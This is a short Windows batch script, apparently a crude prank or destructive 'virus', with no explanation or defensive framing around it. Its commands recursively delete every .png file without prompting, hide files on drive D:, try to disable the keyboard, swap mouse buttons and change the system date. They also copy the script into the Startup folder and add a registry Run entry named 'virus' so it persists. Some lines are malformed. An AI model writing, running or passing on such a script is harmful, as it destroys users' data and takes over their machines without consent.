del %0
/q
attrib +h D:*.*
rundll32 keyboard, disable
date 29.07.36
rundll32 user,SwapMouseButton
del /s /q *.png
md 1
copy %0 C:\1.bat
copy %0 C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "virus" /t REG_SZ /d "Местоположение virus.bat" /f